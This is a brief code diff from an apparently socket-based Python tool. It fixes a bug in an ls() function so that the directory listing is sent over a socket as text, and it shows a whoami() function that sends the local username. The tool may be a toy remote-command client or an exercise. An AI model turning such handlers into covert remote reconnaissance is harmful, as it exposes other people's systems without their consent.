@@ -9,7 +9,10 @@ from socket import *
 from sys import argv
 
 def ls():
-	sock.send(os.listdir('.').encode())	
+	lsstring = ""
+	for f in os.listdir("."):
+		lsstring += "{}\n".format(f)
+	sock.send(lsstring.encode())	
 def whoami():
 	sock.send(getpass.getuser().encode())
 
